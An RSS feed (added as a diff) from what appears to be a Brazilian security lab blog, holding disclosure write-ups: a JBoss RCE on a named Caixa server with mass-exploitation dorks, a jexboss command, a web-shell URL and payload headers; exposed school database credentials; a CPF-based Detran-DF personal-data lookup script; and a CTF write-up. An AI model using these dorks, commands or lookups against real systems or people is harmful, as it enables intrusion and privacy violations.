@@ -1,0 +1,178 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[InsightL4b - Security Research Lab]]></title><description><![CDATA[Security Research Lab.]]></description><link>https://lab.insightsecurity.com.br/</link><generator>Ghost 0.9</generator><lastBuildDate>Sat, 28 Oct 2017 00:31:03 GMT</lastBuildDate><atom:link href="https://lab.insightsecurity.com.br/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Phishruffus - Intelligent threat hunter and phishing servers]]></title><description><![CDATA[<p>O Phishruffus é uma ferramenta projetada para a identificação de ameaças e servidores DNS maliciosos na internet que são utilizados para a prática ilícita de Phishing bancários. </p>
+
+<p>A ferramenta trabalha realizando consultas DNS em dois domínios bancários (Banco do Brasil e Caixa) e através de white-lists com ips existentes no</p>]]></description><link>https://lab.insightsecurity.com.br/phishruffus-intelligent-threat-hunter-and-phishing-servers/</link><guid isPermaLink="false">32a77907-021f-4dc4-a8c8-e972b4005aea</guid><dc:creator><![CDATA[Jhonathan Davi]]></dc:creator><pubDate>Fri, 27 Oct 2017 15:08:49 GMT</pubDate><media:content url="http://lab.insightsecurity.com.br/content/images/2017/10/phishruffus.png" medium="image"/><content:encoded><![CDATA[<img src="http://lab.insightsecurity.com.br/content/images/2017/10/phishruffus.png" alt="Phishruffus - Intelligent threat hunter and phishing servers"><p>O Phishruffus é uma ferramenta projetada para a identificação de ameaças e servidores DNS maliciosos na internet que são utilizados para a prática ilícita de Phishing bancários. </p>
+
+<p>A ferramenta trabalha realizando consultas DNS em dois domínios bancários (Banco do Brasil e Caixa) e através de white-lists com ips existentes no código é possível realizar a validação se o domínio está há responder para o servidor original do banco.</p>
+
+<p><mark> Executando</mark>
+<code>./phishruffus.py --listdns dns_servers.txt --timeout 5</code></p>
+
+<p><mark>Github</mark>
+<a href="https://github.com/jh00nbr/Phishruffus">https://github.com/jh00nbr/Phishruffus</a>  </p>
+
+<script type="text/javascript" src="https://asciinema.org/a/144460.js" id="asciicast-144460" async></script>]]></content:encoded></item><item><title><![CDATA[Remote Command Execution on Jboss - Banking hacking - Caixa]]></title><description><![CDATA[<p>Basicamente a vulnerabilidade é um RCE que se encontra no sistema <strong>GRF Recursal</strong> da Caixa, onde é possivel executar códigos maliciosos de forma remota dentro do servidor. GRF ou Guia de Recolhimento do FGTS é a guia de recolhimento com código de barras para recolhimento regular do FGTS, sendo gerada</p>]]></description><link>https://lab.insightsecurity.com.br/remote-command-execution-on-jboss-banking-hacking-caixa/</link><guid isPermaLink="false">97cbf8d5-4cf6-4c95-bc8d-87a1b4adc2d5</guid><category><![CDATA[hacking]]></category><category><![CDATA[caixa]]></category><category><![CDATA[rce]]></category><category><![CDATA[jboss]]></category><category><![CDATA[exploit]]></category><category><![CDATA[vulnerabilidade]]></category><category><![CDATA[remote code execution]]></category><dc:creator><![CDATA[Jhonathan Davi]]></dc:creator><pubDate>Wed, 03 May 2017 16:07:27 GMT</pubDate><media:content url="http://lab.insightsecurity.com.br/content/images/2017/05/pagar-boleto-internet-banking-da-caixa.png" medium="image"/><content:encoded><![CDATA[<img src="http://lab.insightsecurity.com.br/content/images/2017/05/pagar-boleto-internet-banking-da-caixa.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"><p>Basicamente a vulnerabilidade é um RCE que se encontra no sistema <strong>GRF Recursal</strong> da Caixa, onde é possivel executar códigos maliciosos de forma remota dentro do servidor. GRF ou Guia de Recolhimento do FGTS é a guia de recolhimento com código de barras para recolhimento regular do FGTS, sendo gerada logo após a transmissão do arquivo SEFIP.</p>
+
+<blockquote>
+  <p><code>* <b>Sub domain:</b> http://www.grfrecursal.caixa.gov.br</code><br><code>* <b>Jboss Version vulnerable:</b> 4.2.3.GA</code> <br>
+  <code>* <b>OS: </b>Linux 2.6.32-431.11.2.el6.x86<em>64 (amd64)</em></code> <br>
+  <code>* <b>URI: </b>http://www.grfrecursal.caixa.gov.br/web-console/</code><br><code>* <b>System info:</b> Linux aa0000vx056 2.6.32-431.11.2.el6.x8664 #1 SMP Mon Mar 3 13:32:45 EST 2014 x86<em>64 x86</em>64 x86_64 GNU/Linux </code> <br>
+  <code><b>Documentation:</b></code> <a href="https://developer.jboss.org">https://developer.jboss.org</a><br><br></p>
+</blockquote>
+
+<p><img width="300px" src="http://2.bp.blogspot.com/-xGy919BMJkM/Uo4h1tgpTyI/AAAAAAAAY5U/Kd9_6rKnQHw/s1600/Critical+vulnerability+in+JBoss+Application+Servers+enables+remote+Shell.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"> <br>
+The JBoss Application Server (JBoss AS) is a widely used, open source Java application server. It is part of the JBoss Enterprise Middleware Suite (JEMS) and often used in large enterprise installations.  The JBoss AS allows the development and deployment of Java Platform, Enterprise Edition (JEE) applications, web applications and portals. JBoss AS installations can be found in a variety of environments, ranging from large enterprises’ classic web sites over client-server installations for business software up to control applications for telephone systems. This means that many organisations have JBoss AS installations without knowing exactly how they work.</p>
+
+<p><img width="600px" src="http://i.imgur.com/cmm0hZP.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"></p>
+
+<p><code><b>Web-console</b></code>: The Web console can be used to display the JNDI tree, dump the list of threads, redeploy an application or even shutdown the application server. By default, the console is not secured and can be used by remote attackers. Check References for detailed information.</p>
+
+<p><code><b>Web-console/Invoker ~> www.grfrecursal.caixa.gov.br/web-console/Invoker</b></code></p>
+
+<p><img width="600px" src="http://i.imgur.com/fHu8kiW.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"></p>
+
+<p><b>Detecting Jboss:</b></p>
+
+<p>JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.</p>
+
+<ul>
+<li><b>Tool JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and Exploitation Tool:</b> <a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></li>
+</ul>
+
+<blockquote>
+  <p><b>Mass exploitation - Dorks:</b><br><br>
+  <b>Intitle:</b> ”jboss management console” “application server” version inurl:”web-console”<br><b>intitle: </b>”JBoss Management Console – Server Information” “application server”<br>inurl:”web-console” OR inurl:”jmx-console” <br>
+  <b>inurl:</b> "/web-console/Invoker"<br><b>References:</b> <a href="http://blog.inurl.com.br/2015/06/jexboss-jboss-verify-tool-inurlbr-mass.html">http://blog.inurl.com.br/2015/06/jexboss-jboss-verify-tool-inurlbr-mass.html</a><br><a href="http://blog.inurl.com.br/2015/06/jboss-seam-2-remote-command-execution.html">http://blog.inurl.com.br/2015/06/jboss-seam-2-remote-command-execution.html</a></p>
+</blockquote>
+
+<p><b>Exploiting</b></p>
+
+<p><code>* ./jexboss.py -u http://www.grfrecursal.caixa.gov.br/ --cmd ls</code><br> <code>* Remote shell:</code> www.grfrecursal.caixa.gov.br/jexws3/jexws3.jsp?ppp=ls%20-la </p>
+
+<p><img width="600px" src="http://i.imgur.com/5mqrTjf.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"> <br>
+<img width="600px" src="http://i.imgur.com/dvhr4rr.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"></p>
+
+<blockquote>
+  <p><center><b>Payload</b></center><br> <br>
+  <code>POST /web-console/Invoker HTTP/1.1<br>Host: www.grfrecursal.caixa.gov.br<br>Accept-Encoding: identity<br>Content-Length: 574<br>Connection: keep-alive<br>Content-Type: application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation<br>Accept: text/html, image/gif, image/jpeg, <em>; q=.2, */</em>; q=.2<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0 </code><br> <br>
+  <img width="700px" src="http://i.imgur.com/v5lF6ZP.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa">  </p>
+</blockquote>
+
+<p><center><b>Responsible disclosure</b></center></p>
+
+<blockquote>
+  <p><b>Notificação:</b> 02/05/2017<br>
+   <b>Resposta do responsável:</b> 02/05/2017<br>
+   <b>Correção:</b> 02/05/2017<br>
+   <b>Data de postagem:</b> 03/05/2017
+  <img width="700px" src="http://i.imgur.com/n9h8aCS.png" alt="Remote Command Execution on Jboss - Banking hacking - Caixa"></p>
+</blockquote>
+
+<p><b>References:</b></p>
+
+<ul>
+<li><a href="https://www.redteam-pentesting.de/publications/2009-11-30-Whitepaper">https://www.redteam-pentesting.de/publications/2009-11-30-Whitepaper</a><em>Whos-the-JBoss-now</em>RedTeam-Pentesting_EN.pdf</li>
+<li><a href="https://media.blackhat.com/bh-eu-10/presentations/Papathanasiou/BlackHat-EU-2010-Papathanasiou-Abusing-JBoss-slides.pdf">https://media.blackhat.com/bh-eu-10/presentations/Papathanasiou/BlackHat-EU-2010-Papathanasiou-Abusing-JBoss-slides.pdf</a></li>
+<li><a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Krpata/DEFCON-18-Krpata-Attacking-JBoss.pdf">https://www.defcon.org/images/defcon-18/dc-18-presentations/Krpata/DEFCON-18-Krpata-Attacking-JBoss.pdf</a> </li>
+</ul>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/Sr8ILq1a_yw" frameborder="0" allowfullscreen></iframe>
+
+<p><center> <b>gr33tz:</b> Marcos Abreu e Vinícius Leão</center></p>]]></content:encoded></item><item><title><![CDATA[School Hacking - Vulnerabilidade aplicativo Academico Total]]></title><description><![CDATA[<p><code>" Continuando a série de pesquisas de segurança e levantamentos de vulnerabilidades em aplicativos mobile "</code></p>
+
+<p><code>" No seu tempo de ensino médio quem nunca pensou em "invadir" o servidor da sua própia escola, para fazer uma alteração na nota ou numero de faltas, que atire o primeiro "Exploit". "</code></p>
+
+<p>O Academico Total é</p>]]></description><link>https://lab.insightsecurity.com.br/school-hacking-vulnerabilidade-aplicativo-academico-total/</link><guid isPermaLink="false">896895a9-c054-4d1c-8478-866139ddb159</guid><category><![CDATA[hacking]]></category><category><![CDATA[app]]></category><category><![CDATA[mobile]]></category><category><![CDATA[bug]]></category><category><![CDATA[brasilia]]></category><category><![CDATA[academicototal]]></category><dc:creator><![CDATA[Jhonathan Davi]]></dc:creator><pubDate>Thu, 29 Dec 2016 15:16:48 GMT</pubDate><media:content url="http://lab.insightsecurity.com.br/content/images/2016/12/bug-bounty.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://lab.insightsecurity.com.br/content/images/2016/12/bug-bounty.jpg" alt="School Hacking - Vulnerabilidade aplicativo Academico Total"><p><code>" Continuando a série de pesquisas de segurança e levantamentos de vulnerabilidades em aplicativos mobile "</code></p>
+
+<p><code>" No seu tempo de ensino médio quem nunca pensou em "invadir" o servidor da sua própia escola, para fazer uma alteração na nota ou numero de faltas, que atire o primeiro "Exploit". "</code></p>
+
+<p>O Academico Total é um novo aplicativo, que a algumas escolas de Brasília vem adotando, para que os responsáveis estejam acompanhando o andamento do aluno na escola.</p>
+
+<p><center><b>Descoberta</b></center></p>
+
+<p>Esses dias ao chegar em casa, eu notei o meu irmão verificando algumas notas bimestrais e faltas em um aplicativo de celular, então perguntei pra ele como o aplicativo funcionava, logo após de entender o funcionamento, corri logo para frente do notebook para realizar alguns testes, não demorou muito tempo para encontrar algumas vulnerabilidades graves.</p>
+
+<p><center><b>Funcionamento</b></center></p>
+
+<p><b>Cartão de acesso</b>: Existe um painel na portaria da escola que ao passar o cartao no leitor as informações sobre o aluno são exibidas em uma tela no topo do painel, e tambem é cadastrado no banco de dados o horario de entrada e saida do aluno.</p>
+
+<p><img width="250" src="http://i.imgur.com/XhGIfyG.jpg" alt="School Hacking - Vulnerabilidade aplicativo Academico Total"></p>
+
+<p><b>Aplicativo</b>: Assim que você entra no aplicativo  é solicitado o código academico (código da escola) e a matricula individual que são encontrados na frente do cartão de acesso do aluno.</p>
+
+<p><img width="250" src="http://i.imgur.com/uY5MQ6a.png" alt="School Hacking - Vulnerabilidade aplicativo Academico Total"></p>
+
+<p>Ao digitar as credencias, é solicitado ao banco de dados as seguintes informações sobre o aluno:("Nome", "Matricula" "turma") é nessa hora que é possivel interceptar a requisição (POST) antes de ser enviada ao servidor atraves da ferramenta BurpSuite e obter dados sensiveis do servidor.</p>
+
+<p><img src="http://i.imgur.com/bEGgWe3.png" alt="School Hacking - Vulnerabilidade aplicativo Academico Total"></p>
+
+<p><b>Dados sensiveis</b>: Analisando um pouco mais, eu notei que também é possivel obter dados sensiveis (endereco,usuario,senha) codificados em base64 e em texto claro do servidor de banco de dados, onde fica armazenados todas as informações sobre os alunos possibilitando a alteraçao tanto das notas online, horario de entrada e saida de qualquer aluno de qualquer escola cadastrada no aplicativo, dentre outras alterações de dados.</p>
+
+<p><img src="http://i.imgur.com/JjCvJ9w.png" alt="School Hacking - Vulnerabilidade aplicativo Academico Total"></p>
+
+<p><img src="http://i.imgur.com/IuvrDw8.png" alt="School Hacking - Vulnerabilidade aplicativo Academico Total"></p>
+
+<p><center><b>Responsible Disclosure</b></center></p>
+
+<p>A empresa e os desenvolvedores já foram todos notificados sobre a vulnerabilidade e me autorizaram a publicar esta pesquisa.</p>
+
+<p><b>Notificação:</b> 26/10/2016 <br>
+<b>Resposta do responsavel:</b> 27/10/2016 <br>
+<b>Autorização para publicação desse artigo:</b> Depois de 22/12 <br>
+<b>Data do artigo:</b> 29/11/2016 <br>
+<b>Ano para correção:</b> 2017</p>]]></content:encoded></item><item><title><![CDATA[Verificação de processo seletivo - Cabo Especialista Temporario - EB 2016]]></title><description><![CDATA[<p>Á alguns meses atrás, eu participei de um processo seletivo do Exercito Brasileiro para Cabo Especialista, onde a divulgações e atualizações referentes ao processo seletivo eram contínuas,ou seja todo dia tinha novidades sobre as novas etapas.</p>
+
+<p>Como eu nunca tive paciência para acompanhar as atualizações (até por ser uma</p>]]></description><link>https://lab.insightsecurity.com.br/verificando-atualizacoes-do-processo-seletio-de-cabo-especialista-temporario-2016-2/</link><guid isPermaLink="false">5c77ec84-575e-4b17-9b49-26faebb27967</guid><category><![CDATA[jh00nbr]]></category><category><![CDATA[python]]></category><category><![CDATA[scripting]]></category><category><![CDATA[parsing]]></category><category><![CDATA[bot]]></category><category><![CDATA[beautifulsoup]]></category><category><![CDATA[xpath]]></category><category><![CDATA[html]]></category><category><![CDATA[hacking]]></category><category><![CDATA[exercito]]></category><dc:creator><![CDATA[Jhonathan Davi]]></dc:creator><pubDate>Wed, 28 Dec 2016 22:46:55 GMT</pubDate><media:content url="http://lab.insightsecurity.com.br/content/images/2016/12/exercito.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://lab.insightsecurity.com.br/content/images/2016/12/exercito.jpg" alt="Verificação de processo seletivo - Cabo Especialista Temporario - EB 2016"><p>Á alguns meses atrás, eu participei de um processo seletivo do Exercito Brasileiro para Cabo Especialista, onde a divulgações e atualizações referentes ao processo seletivo eram contínuas,ou seja todo dia tinha novidades sobre as novas etapas.</p>
+
+<p>Como eu nunca tive paciência para acompanhar as atualizações (até por ser uma tarefa muito chata para qualquer pessoa), logo surgiu na minha mente a ideia de desenvolver um bot que faça a checagem das atualizações de maneira automatizada e me notifique com uma mensagem no telegram com a atualização. <br>
+<br> <br>
+<center><h4>Funcionamento básico</h4></center></p>
+
+<p>O bot é desenvolvido em python, inicialmente ele contém armazenado em uma variável a quantidade de noticias existentes no site, depois ele faz a verificação automatizada de 7 em 7 minutos no site do processo seletivo do Exercito Brasileiro, fazendo o parsing das noticias no html e por ultimo comparando a quantidade de noticias extraidas com a quantidade inicial de noticias.</p>
+
+<p>Se a quantidade de noticias extraidas for maior que a quantidade inicial significa que o site contém atualização, e me envia uma mensagem no telegram através de um bot.</p>
+
+<p><center><img src="https://github.com/jh00nbr/bot_atualizacoes_eb_cet_2016/raw/master/tele_bot_img.png" alt="Verificação de processo seletivo - Cabo Especialista Temporario - EB 2016"></center></p>
+
+<p>Repositório Github: <a href="https://github.com/jh00nbr/bot_atualizacoes_eb_cet_2016">bot atualizacoes eb cet 2016</a></p>]]></content:encoded></item><item><title><![CDATA[Consultando resultado de banca de direção no Detran-DF com Python]]></title><description><![CDATA[<p>Esses dias eu estava fazendo algumas pesquisas de segurança e levantamentos de vulnerabilidades em aplicativos mobile, e acabei me deparando com o aplicativo do <mark>Detran-DF</mark>. Pesquisando mais a fundo e fazendo alguns testes, acabei descobrindo alguns Web services e API's que são utilizados pelo aplicativo do Detran na consulta dos</p>]]></description><link>https://lab.insightsecurity.com.br/consultando-resultado-de-banca-de-direcao-no-detran-df-com-python/</link><guid isPermaLink="false">c0f9bb0d-1e42-4044-8079-80d509263ad6</guid><category><![CDATA[getran]]></category><category><![CDATA[detran]]></category><category><![CDATA[python]]></category><category><![CDATA[detran-df]]></category><category><![CDATA[scripting]]></category><dc:creator><![CDATA[Jhonathan Davi]]></dc:creator><pubDate>Tue, 13 Sep 2016 02:25:07 GMT</pubDate><media:content url="http://lab.insightsecurity.com.br/content/images/2016/12/DF-Ipva-d-vida-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://lab.insightsecurity.com.br/content/images/2016/12/DF-Ipva-d-vida-1.jpg" alt="Consultando resultado de banca de direção no Detran-DF com Python"><p>Esses dias eu estava fazendo algumas pesquisas de segurança e levantamentos de vulnerabilidades em aplicativos mobile, e acabei me deparando com o aplicativo do <mark>Detran-DF</mark>. Pesquisando mais a fundo e fazendo alguns testes, acabei descobrindo alguns Web services e API's que são utilizados pelo aplicativo do Detran na consulta dos dados na base de dados do Getran(Sistema de gestão de transito).</p>
+
+<p><center><h3>Dados - API:</h3></center> <br>
+Com uma das API na mão é possível realizar consultas na base de dados da banca de direção do <mark>Detran-DF</mark> utilizando apenas o CPF. A api irá retornar alguns dados como: Nome completo, CPF, renach, Data de nascimento, CFC, Data e horario do seu exame prático.</p>
+
+<p><code><b>Modo de uso:</b> ./getran.py &lt; cpf > | ./getran.py 1234567890</code></p>
+
+<p><code><b>Output:</b><br>Nome completo: JHONATHAN DAVI * * * * * * <br>CPF: * * * .* * * .* * * -**<br>Renach: * * * * * * <br>Data de nascimento: * * / * * / * * * *<br>CFC: CFC AB SERRANA CITY<br>Data: 16/01/2016 Hora: 06:00<br>Resultado: APROVADO</code></p>
+
+<script src="https://gist.github.com/jh00nbr/ed8b1c753201663a09fab93d4c0352ec.js"></script>
+
+<p><code>Código: <a href="https://github.com/jh00nbr/Python/blob/master/getran_df.py">https://github.com/jh00nbr/Python/blob/master/getran_df.py</a> </code></p>]]></content:encoded></item><item><title><![CDATA[Writeup - Intercepted Conversations Pt.1 - IceCTF 2016]]></title><description><![CDATA[<p><img src="http://i.imgur.com/GZ68TG7.png"></p>
+
+<p>"This traffic was picked up by one of our agents. We think this might be a conversation between two elite hackers that we are investigating. Can you see if you can analyze the data? "</p>
+
+<p>To complete this challenge, you have to capture and decode all keys that were typed at</p>]]></description><link>https://lab.insightsecurity.com.br/writeup-intercepted-conversations-pt-1-icectf-2016/</link><guid isPermaLink="false">aa2e04c5-5b31-4431-ae4e-ca3f8396fd26</guid><category><![CDATA[writeup]]></category><category><![CDATA[ctf]]></category><category><![CDATA[icectf]]></category><category><![CDATA[rtfm]]></category><category><![CDATA[jh00nbr]]></category><dc:creator><![CDATA[Jhonathan Davi]]></dc:creator><pubDate>Fri, 26 Aug 2016 16:55:25 GMT</pubDate><media:content url="http://lab.insightsecurity.com.br/content/images/2016/08/12920295_594488057375380_794576918817218602_n.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://lab.insightsecurity.com.br/content/images/2016/08/12920295_594488057375380_794576918817218602_n.jpg" alt="Writeup - Intercepted Conversations Pt.1 - IceCTF 2016"><p><img src="http://i.imgur.com/GZ68TG7.png" alt="Writeup - Intercepted Conversations Pt.1 - IceCTF 2016"></p>
+
+<p>"This traffic was picked up by one of our agents. We think this might be a conversation between two elite hackers that we are investigating. Can you see if you can analyze the data? "</p>
+
+<p>To complete this challenge, you have to capture and decode all keys that were typed at the keyboard by the user that are stored in a file with pcapng traffic <a href="https://en.wikipedia.org/wiki/USB_human_interface_device_class">USB HID</a>.</p>
+
+<p>References: <br>
+<a href="http://www.mindrunway.ru/IgorPlHex/USBKeyScan.pdf">http://www.mindrunway.ru/IgorPlHex/USBKeyScan.pdf</a></p>
+
+<p><code>$ tshark -r intercept.pcapng -T fields -e usb.capdata -Y 'usb.capdata &amp;&amp; usb.transfer_type == 0x01 &amp;&amp; frame.len == 72' | sed -e 's\:\\g' > usb _ hid.dat</code></p>
+
+<p>Leftover capture data:</p>
+
+<p>If the leftover captured begin with "02" or "20" means that the captured key is in capital letters.</p>
+
+<p>Shift: <br>
+0200000000000000 <br>
+2000000000000000</p>
+
+<p><code><b>20</b>000a0000000000 : G<br>00000c0000000000 : i<br>0000070000000000 : d<br><b>02</b>000c0000000000 : I<br><b>02</b>000e0000000000 : K<br><b>02</b>001c0000000000 : Y <br>
+0x0a= g | 0x0c= i | 0x07= d | 0x0c= i | 0x0e= k | 0x1c= y</code></p>
+
+<p>Dvorak keyboard layout: <b>GidIKY{,j0 _ p1V3:_ x,3O7T _ 4LT,4t5}</b> <br>
+Convert Dvorak to Qwerty: <b>IceCTF{wh0 _ l1K3S _ qw3R7Y _ 4NYw4y5}</b></p>
+
+<script src="https://gist.github.com/jh00nbr/639a20643d5330c60fb651800df677a8.js"></script>
+
+<script type="text/javascript" src="https://asciinema.org/a/84528.js" id="asciicast-84528" async></script>]]></content:encoded></item></channel></rss>
